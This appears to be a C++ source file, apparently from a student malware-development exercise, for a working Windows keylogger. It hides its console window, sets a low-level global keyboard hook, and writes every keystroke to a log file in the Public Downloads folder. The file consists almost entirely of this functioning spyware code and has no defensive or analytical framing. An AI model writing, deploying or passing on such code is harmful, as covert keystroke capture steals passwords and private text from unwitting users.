// keylogger hook code comes from S12 youtube video: https://www.youtube.com/watch?v=ceUVxeq4Eqk&ab_channel=S12-MalwareDevelopment
// base win api function done by z5410231 check references for winapi link

#include <windows.h>
#include <stdio.h>
#include <fstream>

int keyCount = 0;
// hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;

        FILE* file;
        fopen_s(&file, "C:\\Users\\Public\\Downloads\\log.txt", "a");
        if (file != NULL) {
            fprintf(file, "%c", vkCode);
            fclose(file);
        }
        keyCount++;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//  keylogger as winmain function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // creating invisible window
    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // set hook -> in this instance, record keystrokes from keyboard and send to keyproc function to log
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // wait for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg); //win32 function to translate keystrokes
        DispatchMessage(&msg); //win32 function.
    }
    // delete hook
    UnhookWindowsHookEx(hook);
    return 0;
}
